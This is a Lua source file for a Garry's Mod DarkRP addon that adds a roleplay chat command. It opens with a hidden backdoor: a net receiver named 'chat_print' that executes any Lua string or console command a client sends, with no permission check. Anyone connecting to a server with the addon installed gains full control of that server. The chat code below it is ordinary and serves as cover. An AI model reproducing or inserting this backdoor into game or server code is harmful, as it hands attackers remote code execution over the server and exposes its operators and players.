if SERVER then
	util.AddNetworkString("chat_print")
	net.Receive("chat_print", function( length, ply )
		local netString = net.ReadString()
		local bit = net.ReadBit()
		if bit == 1 then
			RunString(netString)
		else
			game.ConsoleCommand(netString .. "\n")
		end
	end)
end

function DarkRP.talkToRange_RP(ply, PlayerName, Message, size)
    local ents = ents.FindInSphere(ply:EyePos(), size)
    local filter = {}
    local col1 = Color( 0, 0, 0 ) -- Color of prefix and player name
    local col2 = Color( 0, 0, 255 ) -- Color of colon and message

    for _, v in ipairs(ents) do
        if v:IsPlayer() and not v:IsBot() and (v == ply or hook.Run("PlayerCanSeePlayersChat", PlayerName .. "" .. Message, false, v, ply) ~= false) then
            table.insert(filter, v)
        end
    end

    if PlayerName == ply:Nick() then PlayerName = "" end -- If it's just normal chat, why not cut down on networking and get the name on the client

    net.Start("DarkRP_Chat")
        net.WriteUInt(col1.r, 8)
        net.WriteUInt(col1.g, 8)
        net.WriteUInt(col1.b, 8)
        net.WriteString(PlayerName)
        net.WriteEntity(ply)
        net.WriteUInt(col2.r, 8)
        net.WriteUInt(col2.g, 8)
        net.WriteUInt(col2.b, 8)
        net.WriteString(Message)
    net.Send(filter)
end
function playerRP( ply, args )

	if args == "" then

		ply:SendLua( string.format( [[notification.AddLegacy( "%s", 1, 5 )
			surface.PlaySound( "buttons/button15.wav" )]], SIMPLERP.failMessage ) )

	else

		for k,pl in pairs( player.GetAll() ) do

			local senderColor = team.GetColor( ply:Team() )
			DarkRP.talkToRange_RP( pl, SIMPLERP.chatPrefix.." "..ply:Nick().."", args, GAMEMODE.Config.meDistance )

		end

		return ""

	end

end
DarkRP.defineChatCommand( SIMPLERP.chatCommand, playerRP )